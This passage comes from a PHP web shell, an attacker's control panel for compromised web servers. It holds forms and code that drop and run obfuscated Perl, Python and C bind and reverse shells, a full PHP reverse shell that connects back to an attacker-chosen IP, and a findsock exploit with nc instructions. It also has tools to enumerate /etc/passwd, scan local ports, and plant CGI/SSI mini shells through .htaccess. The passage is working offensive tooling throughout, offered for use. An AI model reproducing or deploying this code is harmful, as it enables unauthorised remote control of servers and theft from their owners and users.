    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
    echo '<br>'.$semi.'</form>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perlremote"><input name="p" type="hidden" value="b"><br>'.$nc.'<br></form>';
   }
   //perl end
   echo "<br>";
   echo '<font color="blue">---> PYTHON </font><br>';
   $searchvar=trim(search("python",$failflag));
   if (empty($searchvar)) {
    echo "fail, no python here<br>";
   } else {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10"  value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pylocal"><input name="p" type="hidden" value="b"> ';
    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
    echo '<br>'.$semi.'</form>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="p" type="hidden" value="b"><input name="shellz" type="hidden" value="pyremote"><br>'.$nc.'<br></form>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">fully interactive backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="p" type="hidden" value="b"><input name="shellz" type="hidden" value="pyint"><br></form>';
    echo '<font color="gray">you need to run special client first: <a href="#" onclick="showTooltip(2)" id="link2"> &gt;&gt; show code &lt;&lt; </a><br>with this one you will be able to run mc, top, vim, etc</font>
    <div id="2" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
    echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>//thanks to ont.rif for interactive backconnect<br>';
    echo "<textarea cols=\"80\" rows=\"20\">";
    echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
    echo "</textarea><br>";
    echo '</div><br>';
   }
   //python end
   echo "<br>";
   echo '<font color="blue">---> C </font><br>';
   $searchvar=trim(search("gcc",$failflag));
   if (empty($searchvar)) {
    echo "fail, no gcc here<br>";
   } else {
    echo '<font color="gray">don\'t remove ".c" file extension! compiler= '.$searchvar.'</font><br>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bd.c"><input type="submit" value="go"><input name="p" type="hidden" value="b"><input name="shellz" type="hidden" value="clocal"> ';
    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
    echo '<br>'.$semi.'</form>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="cremote"><input name="p" type="hidden" value="b"><br>'.$nc.'</form>';
   }
   //c end
   echo "<br>";
   echo '<font color="blue">---> PHP+C findsock </font><font color="gray">(likely wont work on modern php&amp;apache &gt;= 2009)</font><br>';
   $searchvar=trim(search("gcc",$failflag));
   if (empty($searchvar)) {
    echo "fail, no gcc here<br>";
   } else {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">compile findsock saving binary to: <input name="path" type="text" maxlength="500" size="10" value="./findsock"> <input name="p" type="hidden" value="b"><input type="submit" value="go"><input name="shellz" type="hidden" value="findsock"> <a href="#" onclick="showTooltip(3)" id="link3"> &gt;&gt; help &lt;&lt; </a>';
    echo '<div id="3" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
    echo "first save and compile findsock binary, then connect to this shell via nc and specify the path to binary in the request, e.g. if you've saved binary in current dir, make such request: <br><br>h4x0r@localhost$ nc -v ".$_SERVER['SERVER_NAME']." 80 <br> GET ".$_SERVER['SCRIPT_NAME']."?pfs&amp;path=".getcwd()." HTTP/1.0 <br> Host:".$_SERVER['SERVER_NAME']."  &lt;press_Enter&gt;<br>&lt;press_Enter&gt;<br><br>and if findsock will succeed, you'll see a shell: <br> sh-3.2$<br><br>use nc, not telnet! do not forget to specify the correct path! <br>additional info: <br>https://bugs.php.net/bug.php?id=38915<br>https://issues.apache.org/bugzilla/show_bug.cgi?id=46425<br>http://pentestmonkey.net/tools/web-shells/php-findsock-shell<br><br></div>";
    echo '</form><br><br>';
   }
  } //failcheck end
  if (!empty($_POST["shellz"])) {
   //code by security-teams.net
   $perlbdcode='#!'.search("perl",$failflag).'
   use IO::Socket::INET;
   $server = IO::Socket::INET->new(
   LocalPort => '.$_POST["port"].',';
   $perlbdcode.=gzinflate(base64_decode('bY/RCoIwFIbve4rjiJhhSNemEGYQpYIadBFE6RFHpuKsiPDdc6ZB1C7G9n3/OdsBECt4FNgeQDfAd831wQ88a24rgzf18Mqx99OebhivMPtU2fOd6TrOW8qQlxAxpGR5ZClG0j4jsibcPWnudCyioMOQY3nDcmIcwxCLisqyyDzbJiymUpyX5w52FPKiedQPFitHASCzkehEtG/nbgMFiPHXWZ734/ijGeVCiXpimcqT7qtQt3uY5s30It7SevAC'));
   //code by Michael Schierl
   $perlbccode='#!'.search("perl",$failflag);
   $perlbccode.="\n";
   $perlbccode.=gzinflate(base64_decode('lVVtb5pQFP7OrzgaUiChFZxNVxlmru06006MspdkWRqESyVFIHDRNq3/fedeXoTGdZkm5rw859znnPuAeUZgYg2Hi9h9INQQcvQ/uxENDUG0J9bF9cyeggnHfX1wpp+fn5/2y8RiZt9e3GBK184GWv/0tK9j5mp8PZ5MTZ3ZX6yFbYrj+fX3X9pv9GfWvPJ15mtmNyI0ow7topchAewWkW2Dz3A4mV7ZIAszQtKx56VgjoA3VnloFqeUh1hvDKUxjZkvUTeRVOFTiF2C6J6FNFVQIE7BCwiIHUPInrI4IRHIM/vrTxWknkc2vYSuHyUVrLv55Y/5i3U3taafbq2Lm1alSNeJKUmGEMQuDasG9bbQREC7IqEZzpZHieM+yFIglRjM5BHjaO4TmlI2bvYtlo1OAW81d1dekCJ/qRnkoy3sy8m0Gi3Kw7AFyddO9gCaIXjEDyLiyWISeMjSj9P2AeQxoBD4wPL/RiNQ7rCkAs9YSly528uWQdRz7gmlT3AcwXEIPRZZOtkK3r0faBqU2896bFVd3rBV/H+1VWkN/NDCwKjt9kcHWjSnN4QdlJ96s9Y3G1c7Gh1eboW6ms/fQIlJgitk94x2GkSmuGU/BH+YvjY4BAurfhCSKMaVJ4qqK2DqB3Ls+SmygOmMhMSlwKPY+8Xcx8rjmqFinCoo4gUH2Yp4Joojy5fsjrdO6nkOdfBO108gi34ar1WRxuy4j3eGsF0hDVlndy6mGwzi45USxyuRIC5z31fxXdEfoL5DJ+OKkju1mtKNAkdHuBUwTShfI0pDbSz/SmX8IBMfGHiGmjMfH9gBxq5khfu5p6uCAow4fk9ymwaUyDhJzbEJV0o9v00T+0Xkkankr3zriUvSrw7BLWc0lQsGmsqrTWAa2PFvMUhnPyafIfLjPGITF9eIveOcmlwVIG65veU24TZhNhYQdmJBrKBU9cHXvI6pxnUzyamFtPYz1CReQRlMZRo9CN0Jbhjjn0shv8Ku5FlwZSxPuH3CJzGEPw=='));
   //author/license unknown
   $cbdcode=gzinflate(base64_decode('bVBha8IwEP3eX3FMmOns1H2uDoo6kDEV7ZexSejaVA9rKkkUq+y/75q6Drd9CHl59y737jVQxtk+EdDTJsG8vX50Gj8UrmSU/eIK3THFTui/tM7jjTDXvBQG6XRQljxKA6TiidCeBXGGFVBxdWdCEhDqIBTfYeIBKUrgO9qofWzbN1GSKI7S6nj58OG/MrUKaSqBHb2NiGUlitSKBsbrSMEd4cPb0nXOYEXoO2muGPa7PvZKnY+tlgtnZyu2Whhm5bj0mu/HbtOjsWT5m3Rd3/m0VuNdUZHdpXdDAWgTmRuqXraHPlRpseCJjyej0IPFdPDMF+F8FLx4MJ7N5tNwysPBzKXlMAVWd/bh/sEFRxzRMEJU/jgJlTNWrePCbZ0LRYknkaesZkqH9aOtUfI02mJWkKGLkzLLK0EF7EWqtcllxsaTYDic82DySv99AQ=='));
   $cbdcode.='serv_addr.sin_port = htons('.$_POST["port"].');';
   $cbdcode.="\n";
   $cbdcode.=gzinflate(base64_decode('hVJBasMwELznFVsfilRUEgd6cnNOcymF0rNxpbUtImwjKWloyd+7suzGaQjBIHtn2PHMINfK3EpYwaduFHM0KXQCmPN2Jz0QsC2UsvDA4d6h3edhEuD0N7Yl+0M4z2a6hF6A5O5WsOAww4P27DHlGfRk2dot42fkInAOfVfZjtE3DbpqCsPeN+uXjzcB9M4369ebEmMMo53H5hTk6bqxfvGr1gaBpRx+oorBhmSGfNJobHxMmPU0IUQXUmLnb9Q1WRZUXtSe2AlSz//sEJZ3WtEvKipFKxb7sXu0Ax4bGOqYMDEZhVC7bjnqi170DEkvkCV5wgNKw5I53YK5qxORhIPJughRBmetw3EnACfTxwt2dqTnFw=='));
   //author/license unknown
   $cbccode=gzinflate(base64_decode('XVBNawIxEL3nVwwrlESjq161BRELUqui25Msy5pku6FrIkksVfG/N7vWj3oYMvPmzZuXqUnFih0X0LeOS93KX1DtBu1taDX7Eu4/roSTPkKpSlwqB5tUKlwmqflkFFieGqj7/HsVE3SsKBnvIevMjjkoNVPOTSIVWKl6iKdioxXu0DbxJC/rI8nSjSz28AyD12Q8HUW3zlYb5/HcaWVx6rTE1apuTO7GywUtWz2eW/qt8jO1E5MeoPVBGH0BqDdXCHXtNzqNe6QSB5RxL3a+Cf7zRWE5G74ly2gxGrxTGM/ni1k0S6LhnICfkBlgzLRSgjmccQr44QpQJ/DkHVN/i4PQ2WOfENJvEziirTBGGxysmjFcBEngvyx+pMPl6U6I77bdaktZXovOfdGtJgQrcBCupQptHtDA5tCUAYXpx2Ti+6zQVnh2+eUT+gU='));
   // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
   $findsock=gzinflate(base64_decode('bVLbTsMwDH3vV5gioaR09zdG+QLEG0+ApqxJN4suqZIUcRH/jp11Y0yoUhIfHx87J71EW7e9NnAbPsIkuPrVxPH2Lrv8xaNGdw55tJu/mPKdmqA9ryaAQcr8xXuLJMwY2gg7hRYEn5Tf1CXUW+WLgoM3CV8ZNiA4ARcVLBjoqH9sRP4Y1MbcQINW8+iAHXTOx2eby2Vm3jGKKR2+M9aDgikrolRJ+Gn2sjxNcOEhNacUXbKvI3BOae1XNKEP6l+8ZZynD/hpSIM31wiiy6GFNzsXDTV/Wkxf9txGL7PGeRCNrhZLCm83Juqo1q3heiEZu74+3J+SnTHeqp2hihKuSJ1Wpkr2ZTRjJg1n6+5DHPuVwPavbHRKFGKYHe2KR4dCsso4DPE4pE2WsGDbuGvS23WneoOLiQRVBdPDhPx+khptgziosqeJlHIqOhRHr2Wa18SAmu6a6b6bp4tNT4PZaTBnN1sX2ID0vqZuRT5Zo5307Etewlk0UrQ+PN7fn9HD9sjdH0f4S/xO3/4XA5GP8wH7AQ=='));
   //code by b374k
   $pybdcode="#!".search("python",$failflag)."\n";
   $pybdcode.=gzinflate(base64_decode('jVTbahsxEH3ehf0HVS/WYmdjO+2LWxlCcUioE5fYhUIIZrOrZEU2kpHkXP6+mpF8aZxCX7zS6MycMzfLp5U2jmjbI/YNfnT1KFyPOPkksvTy9PdyOrnig/7wc5bOzyfTKafHd1Id24YcVTRLFxeXk+Xs14IPhv1+lv6cXS849fbz2TwcanFPbCPallVPdT7K0sQ2S712XNtipVdCMQzb7RDa6XpIt0M7eWFEWbdSCcty76GiC8RL7rUhkkhFTKkeBGt9hPCcY/QNuMvD90beeqsRbm0UiW9BVVk5qRWrtFLo+dLIVpCFWQuMA/bCClUzOh6PCQUhiTNv+JisvFSOECOqZxYLhRjxWomVizAjlSMUqul5KdqiFiBCeGsDYQIhacB8kCQw5keDkCSCuxxsIcEkkfcEAnA6qisaQe+oPNcOZet3qLPSK4mwjSSICuTAPe5HWwK92PU0Gnf1gl5kaWkenrmfqQIOWRoDwSX/djIi3isWRxijzVfIG9DiVTo28P6oFeA3g1uv9+gO5eKAoXV4e4gxlJSq3hGNTw59EhxNvJ5gCJ8r2bIi1sticMhRth9U345Hln/iWIGtyr5/h33hYWmK8GHxdnq2vLiaLDYrVcxn338s54vryell9PPVcnEy2GaPAuVB2gj3e1cz1ml1VbaNtq7TI6gy3wBaaZ1PHXSZteKh7WGs/R3ivC/XaDPUqLKAHorKMcKgSDE82Z9qsj/WIIKslV/WqinvWhFmF1IqbCvEin3JtxMOCnhcOeCCl+2cgYIEN7FX1rXJsaJFWQEl+6+l2iMdfEyKe35QAl9eEia3Wbtavyg2PFBGYrPgr4D+VYx/sAb8fsA/'));
   //code by ont.rif
   $pyintserver="#!".search("python",$failflag)."\n";
   $pyintserver.="import sys, socket, os, pty, fcntl, struct, termios, select, resource\n";
   $pyintserver.="host = \"".$_POST["ip"]."\"\n";
   $pyintserver.="port = ".$_POST["port"]."\n";
   $pyintserver.=gzinflate(base64_decode('hVT9i+IwEP29f8XcgjSFXlfXdT+EPVg8lyvnKqzCwalIL41rsCYliav+9zfpl9VdsNjGJm9m3ry81KhD1wEt6RqesoGZIB9I+fr8sgiH/Ylfvo9Hvd+L8eSt//wKXh4bUCkEoxhDVlIbH1KpjIerbE9ZarBCqrgwcAW9SLgGCvi3mbhyQOpgwfYcg1sYYTJCfGmnl1KtiQc/oNmtoZq26iVAXhhG475SUvnA7FDxcMFGdqERA2lobyZcaADJQQE+hSwiAm1U9gdTYoF4m97kugRLnjAhiYeyHDTCYi6qObiMlltzhF9EI4U6uhSzoWcKnxnqgynNpXBSHvtAVzyJF8sY9zQ1h0ImBzUT0gAiuuBALjRMwlFv/Cccjv8i+J2ZyBhFDFMbLrUP7nHZ9eH7Tev27vHmsXPXwi2we1CPfgJcfmi27+/bnYFNfZq7Foxr2trNqC01QRrRNXF/4YUlbps+POBtf7bGkgqTBFxSk5CvtPNrRVAua43Kc5BGWjuwifa5FIppuVWUBdimSvgGvVJNvQ3C13CyGI5ewkHfmzbnjrUIcOACVCTeGYG2X6bybPJCP+s7mkjNgHBL+NR4GSKngTi2Z/SDgHv9j4trvcJ2p647R8473C8GE7VlGIBu3aH9rEAswVMS5AOBabWv/qlPYI6ZirtTnI7KAraBOl9sGVMjG8WimNRStpr2suFZUzvFDftkSBt9bDNvL3fjT44SZNnA8A0D3CUP7VlkOzu7p/RLimfUzkq3SnZHckfyJa/C4/j6iRvb4FkoPmJfM/sP'));
   switch ($_POST["shellz"]) {
    case "phpremote":
    // code by pentestmonkey.net. license: GPLv2
     $ip=($_POST["ip"]);
     $port=($_POST["port"]);
     $chunk_size=1400;
     $write_a=null;
     $error_a=null;
     $shell='/bin/sh -i';
     $daemon = 0;
     function printit ($string) { if (!$daemon) { print "$string\n"; }}
     if (function_exists('pcntl_fork')) {
      $pid = pcntl_fork();
      if ($pid == -1) { printit("ERROR: Can't fork<br>"); exit(1); }
      if ($pid) { exit(0); }
      if (posix_setsid() == -1) { printit("Error: Can't setsid()<br>"); exit(1); }
      $daemon = 1;
     } else { printit("WARNING: Failed to daemonise!<br>"); }
     umask(0);
     $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     if (!$sock) { printit("$errstr ($errno)"); exit(1); }
     $process = proc_open($shell, $descriptorspec, $pipes);
     if (!is_resource($process)) { printit("ERROR: Can't spawn shell<br>"); exit(1); }
     stream_set_blocking($pipes[0], 0);
     stream_set_blocking($pipes[1], 0);
     stream_set_blocking($pipes[2], 0);
     stream_set_blocking($sock, 0);
     printit("Successfully opened reverse shell to $ip:$port<br>");
     while (1) {
      if (feof($sock)) { printit("ERROR: Shell connection terminated<br>");     break; }
      if (feof($pipes[1])) { printit("ERROR: Shell process terminated<br>"); break;     }
      $read_a = array($sock, $pipes[1], $pipes[2]);
      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
      if (in_array($sock, $read_a)) {
       $input = fread($sock, $chunk_size);
       fwrite($pipes[0], $input);
      }
      if (in_array($pipes[1], $read_a)) {
       $input = fread($pipes[1], $chunk_size);
       fwrite($sock, $input);
      }
      if (in_array($pipes[2], $read_a)) {
       $input = fread($pipes[2], $chunk_size);
       fwrite($sock, $input);
      }
     }
     fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);@proc_close($process);
    //php backconnect end
    break;
    case "phplocal":
     // code by metasploit.com. license unknown, assuming BSD
     $port=$_POST["port"]; 
     $scl='socket_create_listen';
     if (function_enabled($scl)) {
      $sock=@$scl($port); 
     } else { 
      $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
     $ret=@socket_listen($sock,5); 
     }
     $msgsock=@socket_accept($sock);
     @socket_close($sock);
     while (FALSE !== @socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL)) {
      $buffer = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if (FALSE === $c) { break; }
      if (substr($c,0,3) == 'cd ') {
       chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
       break;
      } else {
       if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) { $c=$c." 2>&1\n"; }
       if (function_enabled('shell_exec')) {
        $buffer=shell_exec($c);
       } else if(function_enabled('passthru')) {
        ob_start();
        passthru($c);
        $buffer=ob_get_contents();
        ob_end_clean();
       } else if(function_enabled('system')) {
        ob_start();
        system($c);
        $buffer=ob_get_contents();
        ob_end_clean();
       } else if(function_enabled('exec')) {
        $buffer=array();
        exec($c,$buffer);
        $buffer=join(chr(10),$buffer).chr(10);
       } else if(function_enabled('proc_open')) {
        $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
        $buffer=NULL;
        while (!feof($pipes[1])) {
         $buffer.=fread($pipes[1],1024);
        }
       @proc_close($handle);     
       } else if(function_enabled('popen')) {
        $fp=popen($c,'r');
        $buffer=NULL;
        if (is_resource($fp)) { 
         while (!feof($fp)) {
          $buffer.=fread($fp,1024);
         }
        }
        @pclose($fp);
       }
      else { $buffer=0; }
      }
      @socket_write($msgsock,$buffer,strlen($buffer));
     }
     @socket_close($msgsock);
     echo "<br><br><font color=\"green\">phplocal done</font>"; 
    break;
    //phpbind end
    case "perllocal":
     $exec_path = trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else { 
      fwrite($fh,$perlbdcode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("perl",$failflag).' '.$exec_path.' && rm -f '.$exec_path.'';
      run($c);
      echo "<br><br><font color=\"green\">perllocal done</font>";
     }
    //perl bind end
    break;
    case "perlremote":
     $exec_path=trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$perlbccode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("perl",$failflag).' '.$exec_path.' '.$_POST["ip"].' '.$_POST["port"].' && rm -f '.$exec_path.'';
      run($c);
      echo "<br><br><font color=\"green\">perlremote done</font>";
     }
    break;
    //perl backconnect end
    case "pylocal":
     $exec_path = trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else { 
      fwrite($fh,$pybdcode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("python",$failflag).' '.$exec_path.' -b '.$_POST["port"].' && rm -f '.$exec_path.'';
      run($c);
      echo "<br><br><font color=\"green\">pylocal done</font>";
     }
    //python bind end
    case "pyremote":
     $exec_path=trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$pybdcode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("python",$failflag).' '.$exec_path.' -r '.$_POST["port"].' '.$_POST["ip"].' && rm -f '.$exec_path.'';
      run($c);
      echo "<br><br><font color=\"green\">pyremote done</font>";
     }
    break;
    //python backconnect end
    case "pyint":
     $exec_path=trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$pyintserver);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("python",$failflag).' '.$exec_path.' && rm -f '.$exec_path.'';
      run($c);
      echo "<br><br><font color=\"green\">pyint done</font>";
     }
    break;
    //python interactive end
    case "clocal":
     $exec_path=trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,"w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; } 
     else {
      fwrite($fh,$cbdcode);
      fclose($fh);
      $c=search("gcc",$failflag)." -w ".$exec_path." -o ".$exec_path." && ".$exec_path." ".$_POST["port"]." | rm -f ".$exec_path."";
      run($c);
      echo "<br><br><font color=\"green\">clocal done</font>";
     }
    break;
    //C bind end
    case "cremote":
     $exec_path=trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($exec_path,"w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$cbccode);
      fclose($fh);
      $c=search("gcc",$failflag)." ".$exec_path." -o ".$exec_path." && ".$exec_path." ".$_POST["ip"]." ".$_POST["port"]." | rm -f ".$exec_path."";
      run($c);
     }
    break;
    case "findsock":
     $fs_path=trim($_POST['path']);
     ob_start();
     @sploent516();
     ob_end_clean();
     $fh=fopen($fs_path.".c","w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$findsock);
      fclose($fh);
      $c=search("gcc",$failflag)." ".$fs_path.".c -o ".$fs_path." && rm -f ".$fs_path.".c";
      run($c);
      echo "<br>compiled, now connect to shell via nc and request ?pfs&amp;path=".$fs_path."<br>";
     }
    break;
   }
  }
  echo $pageend;
  break;
// --------------------------------------------- bind end; extras 
 case "e":
  if (empty($_POST["extraz"]) and $download != "1") {
   echo $title; 
   echo '<font color="blue">---> SysInfo</font><br>';
   echo '<br><a href="#" onclick="showTooltip(6)" id="link5"> &gt;&gt; show &lt;&lt; </a>
   <div id="6" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
   echo 'SERVER_ADDR: '.getenv('SERVER_ADDR').'<br>';
   echo 'REMOTE_ADDR: '.getenv('REMOTE_ADDR').'<br>';
   echo 'HTTP_X_FORWARDED_FOR: '.getenv('HTTP_X_FORWARDED_FOR').'<br>';
   echo 'HTTP_PROXY_CONNECTION: '.getenv('HTTP_PROXY_CONNECTION').'<br>';
   echo 'HTTP_VIA: '.getenv('HTTP_VIA').'<br>';
   echo 'HTTP_USER_AGENT: '.getenv('HTTP_USER_AGENT').'<br>';
   echo 'SERVER_SOFTWARE: '.getenv("SERVER_SOFTWARE").'<br>';
   echo "php API: ".php_sapi_name()."<br>";
   echo "php version: ".version()." (full: ".phpversion().")<br>";
   echo 'disable_functions: '.ini_get('disable_functions').'<br>';
   sploent516();
   echo "<br>";
   echo "current dir: ".getcwd()."<br>"; 
   if (function_enabled('php_uname')) {
    echo "php_uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
   }
   if (function_enabled('posix_uname')) {
    echo "posix_uname: ";
    foreach(posix_uname() AS $key=>$value) {
     print $value." ";
    }
    echo "<br>";
   }
   echo "script owner: ";
   if (function_enabled('get_current_user')) {
    echo get_current_user();
   } else {
    echo "get_current_user() disabled!";
   }
   if (function_enabled('getmyuid')) {
    echo " || uid: ".getmyuid().",";
   } else {
    echo " getmyuid() disabled,";
   }
   if (function_enabled('getmygid')) {
    echo " gid: ".getmygid();
   } else {
    echo " getmygid disabled";
   }
   if (extension_loaded('posix')) {
    echo "<br>current user:";
    if (function_enabled('posix_getuid')) {
     if (function_enabled('posix_getpwuid')) { 
      $processUser = posix_getpwuid(posix_getuid());
      echo $processUser['name'];
     } else {
      echo " posix_getpwuid() disabled!";
     }
     echo " || uid: ".posix_getuid().",";
     if (function_enabled('posix_getgid')) {
      echo " gid: ".posix_getgid();
     } else {
      echo " posix_getgid() disabled";
     }
    } else {
     echo " posix_getuid() disabled!";
    }
    echo "<br>effective user:";
    if (function_enabled('posix_geteuid')) {
     if (function_enabled('posix_getpwuid')) { 
      $processUser = posix_getpwuid(posix_getuid());
      echo $processUser['name'];
     } else {
      echo " posix_getpwuid() disabled!";
     }
     echo " || euid: ".posix_geteuid();
     if (function_enabled('posix_getegid')) {
      echo " egid: ".posix_getegid();
     } else {
      echo ", posix_getegid() disabled";
     }
    } else {
     echo " posix_geteuid() disabled!";
    }
   } else {
    echo "<br>posix.so not loaded, can't get user information";
   }
   echo "</div><br><br>";
   echo '<font color="blue">---> Extraz</font><br><br>';
   if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
   } else {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><input name="p" type="hidden" value="pi"><input type="submit" value="phpinfo()"></form><br>';
   }
   if(function_enabled('posix_getpwuid')) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form><input name="p" type="hidden" value="e">';
    if (!empty($_POST["uidz"])) {
     echo "<br>";
     //code by oRb
     for(;$_POST['uid1'] <= $_POST['uid2'];$_POST['uid1']++) {
      $uid = @posix_getpwuid($_POST['uid1']);
      if ($uid)
       echo join(':',$uid)."<br>\n";
     }
    }
   }
   echo "<br>";
   if(function_enabled('fsockopen')) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">"scan" local open ports from <input name="port1" type="text" size="5" maxlength="5" value="1"> to <input name="port2" type="text" size="5" maxlength="5" value="1337"> <input type="submit" value="go"><input name="portz" type="hidden" value="done"><input name="p" type="hidden" value="e"></form>';
    if (!empty($_POST["portz"])) {
     for($i=$_POST["port1"]; $i <= $_POST["port2"]; $i++)
     {
      $fp=@fsockopen("127.0.0.1", $i, $errno, $errstr, 1);
      if ($fp) {
       echo "-> ".$i."<br>";
       fclose($fp);
      }
     }
    }
   }
   echo '<br><a href="#" onclick="showTooltip(5)" id="link5"> &gt;&gt; minishells help &lt;&lt; </a>
   <div id="5" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
   echo 'sometimes CGI and SSI are not disabled globally on the server, so you could use CGI or SSI shell. but to enable CGI/SSI you need to use special .htaccess files.<br>CGI:<br><textarea cols="44" rows="2">'.$htaccesses['cgi'].'</textarea><br><br>SSI:<br><textarea cols="44" rows="4">'.$htaccesses["ssi"].'</textarea><br><br><b>warning:</b> using custom .htaccess could break this site! (it could result in error 500). <br>it is recommended to create new dir and place custom .htaccess and minishells there.<br><br>//thanks to profexer for SSI shell and to Michael Foord for python shell</div>';
   if (file_exists(".htaccess")) {
    echo '<br>WARNING: my .htaccess will <b>rewrite</b> current one!';
   }
   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'">put mini perl shell into <input name="dir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"><input name="p" type="hidden" value="e"> ';
   if (is_writable("./")) {
